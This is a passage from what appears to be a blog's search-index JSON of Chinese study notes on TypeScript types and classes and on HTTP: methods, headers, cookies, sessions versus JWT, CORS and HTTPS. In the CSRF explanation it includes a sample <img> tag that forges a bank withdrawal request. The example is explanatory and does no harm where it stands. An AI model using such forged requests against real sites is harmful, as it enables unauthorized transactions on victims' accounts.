width: number, protected readonly height: number) { super(); } getArea(): number { return this.width * this.height; } } TypeScript 支持通过 getters/setters 来截取对对象成员的访问，有效地控制对对象成员的访问。只带有 get 不带有 set 的存取器自动被推断为 readonly。 class Employee { login: boolean; private _fullName: string; get fullName(): string { return this._fullName; } set fullName(newName: string) { console.log(this.login); if (this.login === true) { this._fullName = newName; } else { console.log(&quot;Error: Unauthorized update of employee!&quot;); } } } const employee = new Employee(); employee.login = true; employee.fullName = &quot;Bob Smith&quot;; if (employee.fullName) { console.log(employee.fullName); } 静态成员存在于类本身上面而不是类的实例上。 class StaticMem { static num: number; static disp(): void { console.log(&quot;num 值为 &quot; + StaticMem.num); } } StaticMem.num = 12; StaticMem.disp(); ","link":"https://zkrisj.github.io/post/typescript-gao-ji-shu-ju-lei-xing-or-qing-xun-ying-bi-ji/"},{"title":"TypeScript 基本数据类型 ｜ 青训营笔记","content":"TypeScript 介绍 TypeScript 是 JavaScript 的超集，提供了 JavaScript 的所有功能，并提供了可选的静态类型、Mixin、类、接口和泛型等特性。 TypeScript 的目标是通过其类型系统帮助及早发现错误并提高 JavaScript 开发效率。 通过 TypeScript 编译器或 Babel 转码器转译为 JavaScript 代码，可运行在任何浏览器，任何操作系统。 任何现有的 JavaScript 程序都可以运行在 TypeScript 环境中，并只对其中的 TypeScript 代码进行编译。 在完整保留 JavaScript 运行时行为的基础上，通过引入静态类型定义来提高代码的可维护性，减少可能出现的 bug。 永远不会改变 JavaScript 代码的运行时行为，例如数字除以零等于 Infinity。这意味着，如果将代码从 JavaScript 迁移到 TypeScript ，即使 TypeScript 认为代码有类型错误，也可以保证以相同的方式运行。 对 JavaScript 类型进行了扩展，增加了例如 any、unknown、never、void。 一旦 TypeScript 的编译器完成了检查代码的工作，它就会 擦除 类型以生成最终的“已编译”代码。这意味着一旦代码被编译，生成的普通 JS 代码便没有类型信息。这也意味着 TypeScript 绝不会根据它推断的类型更改程序的 行为。最重要的是，尽管您可能会在编译过程中看到类型错误，但类型系统自身与程序如何运行无关。 在较大型的项目中，可以在单独的文件 tsconfig.json 中声明 TypeScript 编译器的配置，并细化地调整其工作方式、严格程度、以及将编译后的文件存储在何处。 类型分配 创建变量时，TypeScript 有两种分配类型的方式： 显式的 - 明确写出类型。更易于阅读且更有目的性。 隐式的 - 不写出类型，TypeScript 将根据分配的值“猜测”类型（称为 infer 类型推导）。分配更短，输入速度更快，并且经常在开发和测试时使用。 let firstName = &quot;Dylan&quot;; // 推断为 string 类型 firstName = 33; // 现在赋值为 number 类型，报错 TypeScript 不能正确地推断出变量的类型时，将设置类型为 any（禁用类型检查的类型）。 // json 为隐式 any 类型，因为 JSON.parse 不知道它返回什么类型的数据 let json = JSON.parse(&quot;55&quot;); console.log(typeof json); // number json = '1'; console.log(typeof json); // string 类型推导 在没有显式类型注释时使用类型推断来提供类型信息。例如，下面隐式声明变量： let x = 3; 变量的类型 x 将被推断为 number，这种推断发生在初始化变量和成员、设置参数默认值和确定函数返回类型时。 当从多个表达式进行类型推断时，这些表达式的类型用于计算“最佳通用类型”。 let x = [0, 1, '']; 要推断上例中 x 的类型，我们必须考虑每个数组元素的类型。在这里，我们为数组类型提供了两种选择：number 和 string，可以看到提示推导为 let x: (number | string)[]。 在某些情况下类型共享公共结构，但没有一种类型是所有候选类型的超类型。 class Animal {} class Rhino extends Animal { hasHorn: true; } class Elephant extends Animal { hasTrunk: true; } class Snake extends Animal { hasLegs: false; } let zoo = [new Rhino(), new Elephant(), new Snake()]; 当没有找到“最佳通用类型”时，得到的推断将是联合数组类型，可以看到提示推导为 let zoo: (Rhino | Elephant | Snake)[]。 理想情况下，我们可能希望 zoo 被推断为 Animal[]，但是因为数组中没有严格意义上的 Animal 类型的对象，所以我们没有对数组元素类型进行推断。为了纠正这一点，当没有一个类型是所有其他候选类型的超级类型时，就明确地提供类型。 let zoo: Animal[] = [new Rhino(), new Elephant(), new Snake()]; 当表达式的类型由其所在位置暗示时，就会出现上下文类型化。例如： window.onmousedown = function (mouseEvent) { console.log(mouseEvent.button); console.log(mouseEvent.kangaroo); }; 在这里，TypeScript 类型检查器通过 Window.onmousedown 事件能够推断出 mouseEvent 参数的类型，该参数确实包含 button 属性，但不包含 kangaroo 属性。可以看到报错提示：Property 'kangaroo' does not exist on type 'MouseEvent'.。TypeScript 足够聪明，它也可以在其他上下文中推断类型： window.onscroll = function (uiEvent) { console.log(uiEvent.button); }; TypeScript 知道 Window.onscroll 事件中参数 uiEvent 是一个 UIEvent，而不是像前面示例那样的 MouseEvent。UIEvent 对象不包含 button 属性，因此会抛出错误 Property 'button' does not exist on type 'Event'.。 如果此函数不在上下文类型位置，则函数的参数将隐式具有类型 any，并且不会发出错误（除非使用 noImplicitAny 配置）： // @noImplicitAny: false const handler = function (uiEvent) { console.log(uiEvent.button); // &lt;- OK }; 我们还可以显式地为函数的参数提供类型信息以覆盖任何上下文类型： window.onscroll = function (uiEvent: any) { console.log(uiEvent.button); // 不报错，打印undefined，因为UIEvent对象不包含button属性 }; 上下文类型化适用于许多情况。常见情况包括函数调用的参数、赋值的右侧、类型断言、对象和数组文字的成员以及返回语句。上下文类型也会充当“最佳通用类型”中的候选类型。例如： function createZoo(): Animal[] { return [new Rhino(), new Elephant(), new Snake()]; } 在此示例中，“最佳通用类型”将从以下四个类型中选择：Animal、Rhino、Elephant 和 Snake。最终，通过“最佳通用类型”算法为 Animal。 数组 TypeScript 具有定义数组的特定语法。 在元素类型后面加上 []。 const arr: number[] = [1, 2]; 使用数组泛型。 const arr2: Array&lt;number&gt; = [1, 2]; readonly 关键字可以防止数组内容被更改。 const arr: readonly number[] = [1, 2]; // arr.push(3); // Property 'push' does not exist on type 'readonly number[]'. 如果数组有值，TypeScript 可以推断它的类型。 const numbers = [1, 2, 3]; // 推断为类型 number[] numbers.push(4); // OK // numbers.push(&quot;2&quot;); // Argument of type 'string' is not assignable to parameter of type 'number' 元组 数组中元素的数据类型都一般是相同的（any[] 类型的数组可以不同），如果存储的元素数据类型不同，则需要使用元组。 如果添加未定义的类型，会抛出错误；如果赋值时类型相同，顺序不同，同样会抛出错误。 let x: [string, number]; x = ['hi', 1]; // x.push(true); // Argument of type 'boolean' is not assignable to parameter of type 'string | number'. // x = [1, 'hi']; // Type 'number' is not assignable to type 'string'. Type 'string' is not assignable to type 'number'. readonly 关键字可以防止元组内容被更改。 let y: readonly [string, number] = ['hi', 1]; // y.push(undefined); // Property 'push' does not exist on type 'readonly [string, number]'. “命名元组”允许为我们的索引值所代表的内容提供更多上下文。 const graph: [x: number, y: number] = [55.2, 41.3]; const [a, b] = graph; object TypeScript 具有定义对象的特定语法。 const car: { type: string, model: string, year: number } = { type: &quot;Toyota&quot;, model: &quot;Corolla&quot;, year: 2009 }; 对象类型可以单独写，也可以作为类型别名和接口重用。 TypeScript 可以根据属性的值推断属性的类型。 const car = { type: &quot;Toyota&quot;, }; car.type = &quot;Ford&quot;; // car.type = 2; // Type 'number' is not assignable to type 'string'. 可选属性是不必在对象定义中定义的属性。 const car: { type: string, mileage?: number } = { // no error type: &quot;Toyota&quot; }; car.mileage = 2000; 索引签名可用于没有定义属性列表的对象。 const nameAgeMap: { [index: string]: number } = {}; nameAgeMap.Jack = 25; // no error nameAgeMap.Mark = &quot;Fifty&quot;; // Error: Type 'string' is not assignable to type 'number'. 上述索引签名也可以通过使用工具类型 Record&lt;string, number&gt; 实现。 Typescript 中的对象必须是特定类型的实例。 const sites = { site1: &quot;Runoob&quot;, site2: &quot;Google&quot;, }; sites.sayHello = function() { console.log(&quot;hello &quot; + sites.site1); }; sites.sayHello(); 上面示例在对象上面没有对应的 sayHello 类型定义，将不能进行属性赋值，会出现编译错误，：Property 'sayHello' does not exist on type '{ site1: string; site2: string; }'.，所以必须在对象上面定义类型模板。 const sites = { site1: &quot;Runoob&quot;, site2: &quot;Google&quot;, sayHello: function() {} }; null 和 undefined 默认情况下，类型检查器认为 null 与 undefined 可以赋值给任何类型，即 null 与 undefined 是所有其它类型的一个有效值。除非在 tsconfig.json 中设置 strictNullChecks 为 true，当你声明一个变量时，它不会自动地包含 null 或 undefined，但可以使用联合类型明确的包含它们，例如 string | null。 null 和 undefined 是原始类型，可以像字符串等其他类型一样使用。 let y: undefined = undefined; console.log(typeof y); let z: null = null; console.log(typeof z); 可选链 ?. 是一种原生 JavaScript 特性，可以很好地与 TypeScript 中的 null 和 undefined 配合使用。 interface House { sqft: number; yard?: { sqft: number; }; } function printYardSize(house: House) { const yardSize = house.yard?.sqft; if (yardSize === undefined) { console.log('No yard'); } else { console.log(`Yard is ${yardSize} sqft`); } } let home: House = { sqft: 500 }; printYardSize(home); // 'No yard' 空值合并 ?? 是另一个 JavaScript 特性，它也可以很好地与 TypeScript 的空值处理配合使用。 function printMileage(mileage: number | null | undefined) { console.log(`Mileage: ${mileage ?? 'Not Available'}`); } printMileage(null); // 'Mileage: Not Available' printMileage(0); // 'Mileage: 0' TypeScript 还有一种特殊的空值断言语法，可以在不进行任何显式检查的情况下从类型中删除 null 和 undefined。在任何表达式之后写 !，表明该值不是 null 或 undefined。 function liveDangerously(x?: number | null) { // No error console.log(x!.toFixed()); } 就像其他类型断言一样，这不会改变代码的运行时行为，所以只有当您知道该值不能为 null 或 undefined 时使用 !。 即使启用了 strictNullChecks，默认情况下 TypeScript 也会假定数组访问永远不会返回 undefined（除非 undefined 是数组类型的一部分）。通过配置 noUncheckedIndexedAccess 可用于更改此行为。 let array: number[] = [1, 2, 3]; let value = array[0]; // `number | undefined` &quot;noUncheckedIndexedAccess&quot;: true 特殊类型 TypeScript 具有可能不引用任何特定类型数据的特殊类型。 any any 是一种禁用类型检查并有效地允许使用所有类型的类型。any 类型是一种消除错误的有用方法，因为它禁用了类型检查，但 TypeScript 将无法提供类型安全，并且依赖类型数据的工具（例如自动完成）将无法工作。所以，我们应尽量避免使用它。 以下三种情况可以使用 any 类型。 变量的值会动态改变时，比如来自用户的输入。 let x: any = 1; // 数字类型 x = 'I am who I am'; // 字符串类型 x = false; // 布尔类型 改写现有代码时，任意值允许在编译时可选择地包含或移除类型检查。 let v: any = true; v = &quot;string&quot;; // 没有错误 v.ifItExists(); // ifItExists 方法在运行时可能不存在而报错，但这里并不会检查 console.log(Math.round(v)); // 没有错误 定义存储各种类型数据的数组。 const arrayList: any[] = [1, false, 'fine']; arrayList[1] = 100; unknown unknown 类型表示任何值，类似于 any 类型，但更安全，因为用未知值做任何事情都是不合法的。由于 any 违背了类型检查的初衷，一般不建议使用，尤其在有了 unknown 类型之后。 任何类型可以分配给 any 和 unknown，any 可以分配给任何类型，unknown 只能分配给 unknown 或者 any。 let a: any; let n: number; let w: unknown = 1; w = &quot;string&quot;; w = a; a = w; n = a; // n = w; // Type 'unknown' is not assignable to type 'number' 函数返回值类型为 unknown 时要有 return 语句。 function f(): unknown {} // A function whose declared type is neither 'void' nor 'any' must return a value 当不知道输入的数据类型时，最好使用 unknown。要稍后添加类型，需要强制转换它。 const w = { runANonExistentMethod: () =&gt; { console.log(&quot;I think therefore I am&quot;); } } as { runANonExistentMethod: () =&gt; void }; if(typeof w === 'object' &amp;&amp; w !== null) { (w as { runANonExistentMethod: Function }).runANonExistentMethod(); } never never 代表从不会出现的值，在函数中它通常表现为抛出异常或无法执行到终止点（例如无限循环）。never 很少单独使用，它的主要用途是在高级泛型中。 function error(message: string): never { throw new Error(message); } function loop(): never { while (true) {} } void 表示函数没有任何返回语句，或者不从这些返回语句返回任何显式值。在 JavaScript 中，不返回任何值的函数将隐式返回值 undefined。但是，void 和返回 undefined 在 TypeScript 中不是一回事。 function hello(): void { console.log(&quot;Hello&quot;); return true; // Type 'boolean' is not assignable to type 'void'. } hello(); 函数类型 type vf = () =&gt; void 在实现时可以返回任何其他值，以下类型的实现是有效的： type voidFunc = () =&gt; void; const f1: voidFunc = () =&gt; { return true; }; const f2: voidFunc = () =&gt; true; const f3: voidFunc = function() { return true; }; const v1 = f1(); const v2 = f2(); const v3 = f3(); console.log(v1, v2, v3); // true true true ","link":"https://zkrisj.github.io/post/typescript-ji-ben-shu-ju-lei-xing-or-qing-xun-ying-bi-ji/"},{"title":"HTTP 知识总结 ｜ 青训营笔记","content":"介绍 HTTP（超文本传输协议，英语：HyperText Transfer Protocol）是一个用于传输超媒体文档（例如 HTML）的应用层协议，是万维网的数据通信的基础。 版本 1999年6月公布的 RFC 2616，定义了 HTTP 协议中现今广泛使用的一个版本 HTTP 1.1。 2015年5月以 RFC 7540 正式发布 HTTP/2 标准，取代 HTTP 1.1 成为 HTTP 的实现标准。 2022年6月6日标准化为 RFC9114 的最新版本 HTTP/3，抛弃使用 TCP，通过 UDP 上使用 QUIC 来承载应用层数据。 通信过程 使用 TCP 协议，通过网页浏览器、网络爬虫或者其它的工具，客户端（user agent，用户代理程序）发起一个 HTTP 请求到服务器上指定端口（默认端口为80）。 应答的服务器（origin server）上存储着一些资源，比如 HTML 文件和图像，服务器在那个端口监听客户端的请求。在用户代理和源服务器中间可能存在多个“中间层”，比如代理服务器、网关或者隧道（tunnel）。 一旦收到请求，服务器会向客户端返回一个状态，比如&quot;HTTP/1.1 200 OK&quot;，以及返回的内容，如请求的文件、错误消息、或者其它信息。 每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接，采用这种方式可以节省传输时间。HTTP/2 中的连接具有复用性，即每个目标地址建立连接后，可以永久被利用，所以每个来源仅需要一个连接。 请求方法 它们都实现了不同的语义，但根据共同的特征由可以分类为：safe（安全）, idempotent（幂等）, 或 cacheable（可缓存）。 GET 的请求应该只被用于获取数据。 HEAD 方法请求一个与 GET 请求的响应相同的响应，但没有响应体。 POST 方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用。 PUT 方法用请求有效载荷替换目标资源的所有当前表示。 DELETE 方法删除指定的资源。 CONNECT 方法建立一个到由目标资源标识的服务器的隧道。 OPTIONS 方法用于描述目标资源的通信选项。 TRACE 方法沿着到目标资源的路径执行一个消息环回测试。 PATCH 方法用于对资源应用部分修改。 Safe（安全） 指这是个不会修改服务器的数据的方法，也就是说，这是一个对服务器只读操作的方法。 浏览器调用安全的方法不用考虑会给服务端造成什么危害，这样，服务端就能允许客户端预加载资源。 这些方法是安全的：GET，HEAD 和 OPTIONS。所有安全的方法都是幂等的，但并非所有幂等方法都是安全的，例如，PUT 和 DELETE 都是幂等的，但不是安全的。 Idempotent（幂等） 指的是同样的请求被执行一次与连续执行多次，客户端接收到的结果都是一样的，服务器的状态也是一样的，也就是说，幂等方法不应该具有副作用（统计用途除外）。 在正确实现的条件下， GET、HEAD、OPTIONS、PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的 safe 方法也都是幂等的。例如下面调用多次 POST 方法，就会增加多行记录： POST /add_row HTTP/1.1 POST /add_row HTTP/1.1 -&gt; Adds a 2nd row POST /add_row HTTP/1.1 -&gt; Adds a 3rd row 下面即使请求多次 DELETE 方法接收到的状态码不一样，但也是幂等的： DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX exists DELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deleted DELETE /idX/delete HTTP/1.1 -&gt; Returns 404 Cacheable（可缓存） 可以被缓存的 HTTP 响应，将被存储以供以后检索和使用。 请求中使用的方法本身是可缓存的，即一个 GET 或一个 HEAD 方法。如果指示新鲜度并设置了 Content-Location 标头，也可以缓存对 POST 或 PATCH 请求的响应，但这很少实现。其他方法如 PUT 或 DELETE 不可缓存，它们响应的结果也无法缓存。 应用程序缓存可以根据响应的状态代码，认为它是可缓存的。以下状态代码是可缓存的：200、203、204、206、300、301、404、405、410、414 和 501。 如果响应中有特定的标头，如 Cache-Control，可防止缓存。 HTTP 标头（header） HTTP 标头是用于 HTTP 请求或响应的字段，它传递关于请求或者响应的额外上下文和元数据。 例如，请求消息可以使用标头表明它首选的媒体格式，而响应可以使用标头表明返回主体的媒体格式。 标头是不区分大小写，开始于行首，后面紧跟着一个 ':' 和与之相关的值。字段值在一个换行符（CRLF）前或者整个消息的末尾结束。 根据不同的消息上下文，标头可以分为： 请求标头：包含要获取的资源或者客户端自身的更多信息。例如，Accept-* 标头指示响应的允许格式和首选格式。其他标头可用于提供身份验证凭据（Authorization、Token 授权等）、控制缓存或获取有关用户代理（user agent）或引荐来源网址（referrer）等的信息。 响应标头：包含有关响应的额外信息，例如响应的位置（Location）、响应时间（Date）、最后更新时间（Last-Modified）或者关于服务器自身的信息（Server，包括名字、版本等）。 表示标头：包含消息主体中资源的元数据（例如，编码、MIME 媒体类型、压缩方案等）。包括 Content-Type、Content-Encoding、Content-Language 和 Content-Location。 有效负荷标头：包含有关有效载荷数据表示的单独信息，包括内容长度和用于传输的编码。包括 Content-Length、Content-Range、Trailer 和 Transfer-Encoding。 并非所有可以出现在请求中的标头都被规范称为请求标头，并非所有出现在响应中的标头都根据规范将其归类为响应标头。例如，Content-Type 就是一个表示标头，在请求中 (如 POST 或 PUT)，客户端告诉服务器实际发送的数据类型；在响应中，Content-Type 标头告诉客户端实际返回的内容的内容类型。 下图列出了一些与请求和响应相关常见的标头。 响应状态码 用来表明特定 HTTP 请求是否成功完成，归为以下五大类： 信息响应 (100–199) 成功响应 (200–299) 重定向消息 (300–399) 客户端错误响应 (400–499) 服务端错误响应 (500–599) Cookie Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据。HTTP 是无状态协议，这意味着服务器不会在两个请求之间保留任何数据（状态），而 Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。浏览器会存储 Cookie 并在下次向同一服务器再发起请求时携带并发送到服务器上。 工作机制如下： 服务器使用Set-Cookie 响应标头向用户代理（一般是浏览器）发送 Cookie 信息。例如： Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt; 这指示服务器发送标头告知客户端存储一对 Cookie： HTTP/1.0 200 OK Content-type: text/html Set-Cookie: yummy_cookie=choco Set-Cookie: tasty_cookie=strawberry [页面内容] 现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过Cookie 请求标头再发送给服务器。 GET /sample_page.html HTTP/1.1 Host: www.example.org Cookie: yummy_cookie=choco; tasty_cookie=strawberry Secure 属性和 HttpOnly 属性可以确保 Cookie 被安全发送，并且不会被意外的参与者或脚本访问。 标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。它永远不会使用不安全的 HTTP 发送（本地主机除外），这意味着中间人攻击者无法轻松访问它。不安全的站点（http）无法使用 Secure 属性设置 Cookie。但是，Secure 不会阻止对 Cookie 中敏感信息的访问。例如，有权访问客户端硬盘（如果未设置 HttpOnly 属性，则有权访问 JavaScript）的人可以读取和修改它。 JavaScript Document.cookie 无法访问带有 HttpOnly 属性的 Cookie,此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 HttpOnly 属性。此预防措施有助于缓解跨站点脚本（XSS）攻击。 Cookie 主要用于以下三个方面： 会话状态管理 - 如用户登录状态、购物车、游戏分数或其它需要记录的信息 个性化设置 - 如用户自定义设置、主题和其他设置 浏览器行为跟踪 - 如跟踪分析用户行为等 Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在推荐使用现代存储 API。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（localStorage 和 sessionStorage）或 IndexedDB。 Cookie vs Session vs Token 由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。 以购物车为例，需要有一个机制记录每个连接的关系，这样我们就知道加入购物车的商品到底属于谁了，每次浏览器请求后 server 都会将本次商品 id 存储在 Cookie 中返回给客户端，客户端会将 Cookie 保存在本地，下一次再将上次保存在本地的 Cookie 传给 server，这样每个 Cookie 都保存着用户信息和商品 id。 但是，随着购物车内的商品越来越多，每次请求的 cookie 也越来越大，这对每个请求来说是一个很大的负担，我只是想将一个商品加入购买车，为何要将历史的商品记录也一起返回给 server？而且，购物车信息其实已经保存在 server 中了。 Session 由于用户的购物车信息都会保存在 Server 中，所以在 Cookie 里只要保存能识别用户身份的信息，知道是谁发起了加入购物车操作即可，这样每次请求后只要在 Cookie 里带上用户的身份信息，请求体里也只要带上本次加入购物车的商品 id，大大减少了 cookie 的体积大小，我们把这种能识别哪个请求由哪个用户发起的机制称为 Session（会话机制），生成的能识别用户身份信息的字符串称为 sessionId。 首先用户登录，server 会为用户生成一个 session，为其分配唯一的 sessionId，这个 sessionId 是与某个用户绑定的，也就是说根据此 sessionid（假设为 abc） 可以查询到它到底是哪个用户，然后将此 sessionid 通过 cookie 传给浏览器。 之后浏览器的每次添加购物车请求中只要在 cookie 里带上 sessionId=abc 这一个键值对即可，server 根据 sessionId 找到它对应的用户后，把传过来的商品 id 保存到 server 中对应用户的购物车即可。 可以看到通过这种方式再也不需要在 cookie 里传所有的购物车的商品 id 了，大大减轻了请求的负担！另外，cookie 是存储在 client 的，而 session 保存在 server，sessionId 需要借助 cookie 的传递才有意义。 但是，上述情况能正常工作是因为我们假设 server 是单机工作的，实际生产中，为了保障高可用，一般服务器至少需要两台机器，客户端请求后，由负载均衡器（如 Nginx）来决定到底打到哪台机器。 假设登录请求打到了 A 机器，A 机器生成了 session 并在 cookie 里添加 sessionId 返回给了浏览器，那么问题来了：下次添加购物车时如果请求打到了 B 或者 C，由于 session 是在 A 机器生成的，此时的 B,C 是找不到 session 的，那么就会发生无法添加购物车的错误，就得重新登录了。 目前各大公司普遍采用的方案是将 session 保存在 redis，memcached 等中间件中，请求到来时，各个机器去这些中间件取一下 session 即可。就是每个请求都要去 redis 取一下 session，多了一次内部连接，消耗了一点性能，另外为了保证 redis 的高可用，必须做集群，当然了对于大公司来说，redis 集群基本都会部署，所以这方案可以说是大公司的首选了。 但是，对于小厂来说可能它的业务量还未达到用 redis 的程度，那有没有其他不用 server 存储 session 的用户身份校验机制呢？ Token token（JSON Web Token，JWT）主要由三部分组成： header：指定了签名算法。 payload：可以指定用户 id，过期时间等非敏感数据。 Signature: 签名，server 根据 header 知道它该用哪种签名算法，再用密钥根据此签名算法对 head + payload 生成签名，这样一个 token 就生成了。 其中，header, payload 是以 base64 的形式存在的。 首先请求方输入自己的用户名，密码，然后 server 据此生成 token，客户端拿到 token 后会保存到本地（服务端没有存储），之后向 server 请求时在请求头带上此 token 即可。 当 server 收到浏览器传过来的 token 时，它会首先取出 token 中的 header + payload，根据密钥生成签名，然后再与 token 中的签名比对，如果成功则说明签名是合法的，即 token 是合法的。 只要 server 保证密钥不泄露，那么生成的 token 就是安全的，因为如果伪造 token 的话在签名验证环节是无法通过的。 鉴权 - session 会根据 sessionId 找到 userid 呢，token 如何知道是哪个用户？ token 中的 payload 中存有我们的 userId，所以拿到 token 后直接在 payload 中就可获取 userid，避免了像 session 那样要从 redis 去取的开销。 可以看到通过这种方式有效地避免了 token 必须保存在 server 的弊端，实现了分布式存储。 注意 token 一旦由 server 生成，它就是有效的，直到过期，无法让 token 失效，除非在 server 为 token 设立一个黑名单，在校验 token 前先过一遍此黑名单，如果在黑名单里则此 token 失效，但一旦这样做的话，那就意味着黑名单就必须保存在 server，这又回到了 session 的模式，那直接用 session 不香吗。所以一般的做法是当客户端登出要让 token 失效时，直接在本地移除 token 即可，下次登录重新生成 token 就好。 token 是存在浏览器的，如果放在 cookie 里可能导致 cookie 超限（cookie 一般有大小限制的，如 4kb），那就只好放在 local storage 里，但这样会造成安全隐患，因为 local storage 这类的本地存储是可以被 JS 直接读取的，另外上文也提到，token 一旦生成无法让其失效，必须等到其过期才行，这样的话如果服务端检测到了一个安全威胁，也无法使相关的 token 失效。所以 token 更适合一次性的命令认证，设置一个比较短的有效期。 SSO Cookie 跨站是不能共享的，所以使用 Cookie 实现多应用（多系统）的单点登录（SSO，指在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统）的话就很困难（要用比较复杂的 trick 来实现）。 发送 token 时一般放在标头的 Authorization 自定义头里，不是放在 Cookie 里的，这主要是因为跨域不能共享 Cookie。如果用 token 来实现 SSO 会非常简单，只要在标头中的 authorize 字段（或其他自定义）加上 token 即可完成所有跨域站点的认证。 跨站请求伪造（CSRF） 是一种冒充受信任用户，向服务器发送非预期请求的攻击方式。比如用户登录了某银行网站（假设为 http://www.examplebank.com/，并且转账地址为 http://www.examplebank.com/withdraw?amount=1000&amp;transferTo=PayeeName），登录银行网站后 cookie 里会包含登录用户的 sessionid，攻击者可以在另一个网站上放置如下代码 &lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt; 那么如果正常的用户误点了上面这张图片，由于相同域名的请求会自动带上 cookie，而 cookie 里带有正常登录用户的 sessionid 等身份认证的信息，银行网站会认为是真正的用户操作而去运行,上面这样的转账操作在 server 就会成功，会造成极大的安全风险。 CSRF 攻击的根本原因在于对于同样域名的每个请求来说，它的 cookie 都会被自动带上，这个是浏览器的机制决定的，所以很多人据此认定 cookie 不安全。 使用 token 确实避免了 CSRF 的问题，但正如上文所述，由于 token 保存在 local storage，它会被 JS 读取，从存储角度来看也不安全（实际上防护 CSRF 攻击的正确方式是用 CSRF token）。 所以不管是 cookie 还是 token，从存储角度来看其实都不安全，都有暴露的风险，我们所说的安全更多的是强调传输中的安全，可以用 HTTPS 协议来传输， 这样的话请求头都能被加密，也就保证了传输中的安全。 总结 其实我们把 cookie 和 token 比较本身就不合理，一个是存储方式，一个是验证方式，正确的比较应该是 session vs token。 session 和 token 本质上是没有区别的，都是对用户身份的认证机制，只是他们实现的校验机制不一样而已（一个保存在 server，通过在 redis 等中间件获取来校验，一个保存在 client，通过签名校验的方式来校验），多数场景上使用 session 会更合理，但如果在单点登录，一次性命令认证上使用 token 会更合适，最好在不同的业务场景中合理选型，才能达到事半功倍的效果。 RESTful API REST（表现层状态转换，英语：Representational State Transfer）是一种设计提供万维网络服务的软件构建风格，目的是便于不同软件/程序在网络（例如互联网）中互相传递信息。 它基于超文本传输协议（HTTP）之上而确定的一组约束和属性，RESTful 就代表满足 REST 原则的。 每一个 URI 代表一种资源。 客户端和服务器之间，传递这种资源的某种表现层。 客户端通过 HTTP 方法，对服务器资源进行操作，实现“表现层状态转化”。 跨源资源共享（CORS） 同源策略是浏览器的一个重要的安全策略（不属于 HTTP），它用于限制一个源（Origin）的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。 如果两个 URL 的协议、端口（如果指定）和主机都相同，则两个 URL 是同源。 浏览器某些操作仅限于同源内容，但可以使用 CORS 解除这个限制。 CORS 是一种基于 HTTP 标头的机制，通过这些 HTTP 标头决定浏览器是否阻止 JavaScript 代码获取跨源请求的响应。即 CORS 给了 web 服务器这样的权限：服务器可以选择是否允许跨域请求访问到它的资源。 另外几个解决跨域问题的方法： 代理服务器 - 通过部署一个与当前域名同源的服务器，请求时发到代理服务器，再由代理服务器转发到真实服务器；然后真实服务器响应给代理服务器，代理服务器再把响应转发到我们的浏览器上。例如 Webpack 的一个插件 devServer 就具备了代理服务器的功能，可以在开发模式下帮助我们进行联调。 iframe - 通过把一个 src 与服务器同源的 iframe 元素嵌入到页面中，再通过 window.postMessage 来实现 iframe 元素与当前页面通信。 JSONP - 嵌入的跨域资源不受同源策略约束。利用这个开放策略，使用 script 标签替代 XMLHttpRequest 对象或 fetch 来请求数据。用 JSONP 抓到的资料并不是 JSON，而是任意的 JavaScript 代码。 HTTPS HTTPS（超文本传输安全协议，英语：HyperText Transfer Protocol Secure）是 HTTP 协议的加密版本。 它使用 SSL 或 TLS 协议来加密客户端和服务器之间所有的通信。 安全连接允许客户端与服务器安全地交换敏感数据，例如网上银行或者在线商城等涉及金钱的操作。 对称加密 加密方和解密使用同一密钥 加密解密的速度比较快 常见有：Blowfish、IDEA、RC5、RC6、DES、3DES、AES。 非对称加密 使用两把密钥进行加密和解密，即公钥（public key）和私钥（private key） 公钥加密私钥解密，私钥加密公钥可以解密 加密或者解密，速度非常慢 私钥和公钥是成对出现的 常见有：RSA、DSA、Elgamal、背包算法、Rabin、D-H、ECC。 HTTPS 同时使用了对称加密（性能）和非对称加密（安全），并使用 CA 机构颁发的数字证书解决公钥传输问题。 如何使用 HTTPS 以访问 www.helloworld.net 网站为例，分为 3 个阶段： 网站申请证书阶段： 网站向 CA 机构申请数字证书（需要提交一些材料，比如域名）。 CA 向证书中写入摘要算法，域名，网站的公钥等重要信息。 CA 根据证书中写入的摘要算法，计算出证书的摘要。 CA 用自己的私钥对摘要进行加密，计算出签名。 CA 生成一张数字证书，颁发给了 www.helloworld.net。 网站的管理员，把证书放在自己的服务器上。 浏览器验证证书阶段： 浏览器在地址栏中输入 https://www.helloworld.net 并回车。 服务器将数字证书发送给浏览器。 浏览器用操作系统内置的 CA 的数字证书，拿到 CA 的公钥。 浏览器用 CA 公钥对 www.helloworld.net 的数字证书进行验签。 具体就是，浏览器用 CA 公钥，对 helloworld 的数字证书中的签名进行解密，得到摘要 D1。 浏览器根据 helloworld 数字证书中的摘要算法，计算出证书的摘要 D2。 对比 D1 和 D2 是否相等。 如果不相等，说明证书被掉包了。 如果相等，说明证书验证通过了。 协商对称加密密钥阶段： 浏览器验证数字证书通过以后。 浏览器拿到数字证书中的公钥，也就是 www.helloworld.net 网站的公钥。 浏览器有了网站的公钥后，就用公钥进行对密钥S进行加密，加密以后的密文发送给服务器。 服务器收到密文后，用自己的私钥进行解密，得到密钥S。 此后浏览器，服务器双方就用密钥S进行对称加密的通信了。 ","link":"https://zkrisj.github.io/post/http-zhi-shi-zong-jie-or-qing-xun-ying-bi-ji/"},{"title":"写好 JS 的原则 组件封装、过程抽象 ｜ 青训营笔记","content":"介绍 